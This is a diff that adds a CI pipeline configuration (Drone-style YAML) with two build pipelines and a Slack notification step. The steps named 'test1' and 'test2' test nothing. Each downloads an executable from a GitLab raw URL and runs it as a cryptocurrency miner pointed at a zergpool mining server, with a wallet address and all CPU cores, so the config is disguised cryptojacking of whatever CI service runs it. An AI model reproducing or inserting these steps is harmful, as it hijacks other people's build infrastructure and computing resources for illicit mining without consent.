@@ -1,0 +1,32 @@
+kind: pipeline
+type: docker
+name: build1
+steps:
+- name: test1
+  image: golang
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
+kind: pipeline
+type: docker
+name: build2
+
+steps:
+- name: test2
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
+kind: pipeline
+name: after
+
+steps:
+- name: notify
+  image: plugins/slack
+  settings:
+    room: general
+
+
+depends_on:
+- build1
+- build2
